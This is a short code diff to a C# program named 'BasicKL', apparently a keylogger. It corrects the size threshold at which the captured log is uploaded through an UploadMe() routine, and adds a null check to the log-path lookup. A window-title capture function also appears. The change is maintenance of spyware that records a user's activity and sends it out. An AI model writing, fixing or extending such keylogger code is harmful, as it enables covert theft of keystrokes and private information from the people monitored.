@@ -79,7 +79,7 @@ namespace BasicKL
                 long maxSizeB = (long)(maxSizeMb) << 20;
 
                 FileInfo logInfo = new FileInfo(GetLogPath());
-                if (logInfo.Length >= 200)
+                if (logInfo.Length >= maxSizeB)
                 {
                     UploadMe();
                 }
@@ -131,7 +131,7 @@ namespace BasicKL
             if (!uploading)
                 log.Info("");
 
-            return root.File;
+            return root != null ? root.File : String.Empty;
         }
 
         private string GetActiveWindowTitle()
